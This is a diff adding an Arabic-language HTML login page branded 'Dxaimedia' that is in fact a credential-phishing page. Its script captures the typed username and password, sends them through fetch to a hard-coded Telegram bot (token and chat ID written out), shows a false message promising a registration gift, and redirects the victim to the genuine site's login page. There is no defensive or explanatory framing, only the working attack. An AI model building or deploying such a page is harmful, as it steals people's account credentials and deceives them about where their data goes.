@@ -1,0 +1,76 @@
+
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>صفحة تسجيل الدخول</title>
+<style>
+  body {
+    background-color: #f0f0f0; /* لون الخلفية الجديد */
+    background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQxoyHMrmn6XY8i40Fyp6JqsOmMJ3Q471EwpQ&s'); /* رابط الصورة التي ترغب في استخدامها */
+    background-size: cover;
+    background-position: center;
+    background-repeat: no-repeat;
+    text-align: center; /* توسيط النصوص */
+  }
+  
+  #loginForm {
+    margin: 0 auto; /* توسيط النموذج */
+    width: 90%; /* عرض النموذج بنسبة مئوية */
+    max-width: 400px; /* الحد الأقصى للعرض */
+    padding: 20px;
+    background-color: rgba(255, 255, 0, 0.5); /* لون خلفية النموذج بشفافية */
+    border-radius: 10px;
+  }
+  
+  button {
+    background-color: yellow; /* لون زر تسجيل الدخول */
+    color: black; /* لون النص على الزر */
+    padding: 10px 20px;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+  }
+</style>
+</head>
+<body>
+<h1>Dxaimedia</h1>
+<form id="loginForm">
+  <label for="username">اسم المستخدم:</label><br>
+  <input type="text" id="username" name="username"><br>
+  <label for="password">كلمة المرور:</label><br>
+  <input type="password" id="password" name="password"><br><br>
+  <button type="submit">تسجيل الدخول</button>
+</form>
+<p>ليس لديك حساب؟ <a href="register.html">سجل الآن</a></p>
+
+<script>
+document.getElementById('loginForm').addEventListener('submit', function(event) {
+  event.preventDefault();
+  
+  let username = document.getElementById('username').value;
+  let password = document.getElementById('password').value;
+  
+  // إرسال معلومات المستخدم إلى بوت التليجرام
+  let telegramBotToken = '2109480053:AAGN986ay19a0jKNEf-zY9MD3H4AcEp89AA';
+  let chatId = '816219395';
+  let message = `تم تسجيل الدخول!\nاسم المستخدم: ${username}\nكلمة المرور: ${password}`;
+  let telegramURL = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+  
+  fetch(telegramURL)
+    .then(response => {
+      if (response.ok) {
+        alert('تم التسجيل ....ستستلم هدية التسجيل بعد قليل');
+        window.location.href = 'https://www.dxaimedia.com/#/pages/login/login'; // توجيه المستخدم إلى الرابط بعد الضغط
+      } else {
+        alert('حدث خطئ ما حاول مرة اخرى');
+      }
+    })
+    .catch(error => {
+      console.error('حدث خطئ ما اعد:', error);
+    });
+});
+</script>
+</body>
+</html>
